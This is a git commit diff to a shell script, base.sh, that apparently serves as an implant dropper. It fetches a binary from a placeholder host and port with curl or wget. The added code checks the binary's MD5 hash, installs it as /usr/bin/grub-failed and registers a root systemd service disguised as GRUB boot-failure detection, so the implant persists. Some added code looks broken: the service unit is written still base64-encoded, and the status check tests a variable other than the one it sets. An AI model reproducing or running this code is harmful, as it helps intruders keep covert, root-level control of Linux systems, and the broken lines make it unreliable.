335a2b36ab25acde2d3367152ae29c051ad7b770
0xeversanaga <eversanaga@gmail.com>
2026-05-21 08:08:30 +0000

    Added MD5sum verification for implant and global systemd service persistence

--- base.sh
+++ base.sh
@@ -16,6 +16,7 @@ HOME=$(get_home "$USER")
 
 url="http://<HOST>:<PORT>/<IMPLANT>"
 out="/tmp/<IMPLANT>"
+expected="<MD5_HASH>"
 
 for cmd in curl wget "busybox wget"; do
     case "$cmd" in
@@ -33,3 +34,33 @@ for cmd in curl wget "busybox wget"; do
             ;;
     esac
 done
+
+if [ -f "$out" ]; then
+    read -r hash _ < <(md5sum "$out")
+    if [ "$hash" = "$expected" ]; then
+        echo "[+]-----| Binary successfully downloaded!"
+        echo "[i]-----| Setting up binary.."
+        chmod +x "/tmp/<IMPLANT>"
+
+        if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
+            echo "[i]-----| Setting up global systemd service.."
+            mv "/tmp/<IMPLANT>" /usr/bin/grub-failed
+            echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUdydWIgZmFpbGVkIGJvb3QgZGV0ZWN0aW9uCkFmdGVyPW5ldHdvcmsudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1mb3JraW5nClRpbWVvdXRTdGFydFNlYz0wCkV4ZWNTdGFydD0vdXNyL2Jpbi9ncnViLWZhaWxlZApVc2VyPXJvb3QKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=' > '/etc/systemd/system/grub-failed.service'
+
+            systemctl daemon-reload 2>/dev/null
+            systemctl enable "grub-failed" 2>/dev/null
+            systemctl start "grub-failed" 2>/dev/null &
+
+            sleep 2
+            p=$(systemctl is-active "grub-failed" 2>/dev/null)
+            if [[ "$s" == "active" || "$s" == "activating" ]]; then
+                systemctl restart "grub-failed" &
+                echo "[+]-----| Binary persistence established!"
+                echo "[i]-----| Check systemd: $ systemctl --no-pager status grub-failed"
+            else
+                echo "[!]-----| Failed to established persistence.."
+                echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
+            fi
+        fi
+    fi
+fi
